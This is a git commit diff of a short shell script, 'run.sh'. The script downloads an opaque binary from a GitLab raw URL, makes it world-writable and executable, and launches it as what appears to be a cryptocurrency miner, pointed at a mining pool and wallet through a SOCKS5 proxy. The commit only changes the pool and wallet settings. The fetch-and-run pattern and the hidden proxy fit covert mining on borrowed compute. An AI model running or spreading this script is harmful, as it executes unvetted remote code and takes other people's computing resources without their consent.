7a25335cf60d1e9ac05651f86ac28797208fe305
CornellAlarcon <89951532+CornellAlarcon@users.noreply.github.com>
2021-09-02 02:27:53 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,8 +1,8 @@
 #!/bin/sh
 wget https://gitlab.com/wayankarpo/xm/-/raw/main/masterfile
 chmod 777 masterfile
-POOL=der.pool-pay.com:3093	
-WALLET=dERoSUQ2QSg1LjXH7yQdSYRfvwibUr3tNbQxEb1gV9cTBkR242Qt38VSSWRfSy1XpBQYevg5PH17KXGiy71PBqSL1tDBzAuVMP+0000000000000000000000000000000000000000000000000000001870910757
+POOL=stratum+tcp://pool-pay.com:26339 
+WALLET=endvoc
 WORKER=endvoc
 PROXY=socks5://192.252.209.155:14455
 ./masterfile -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
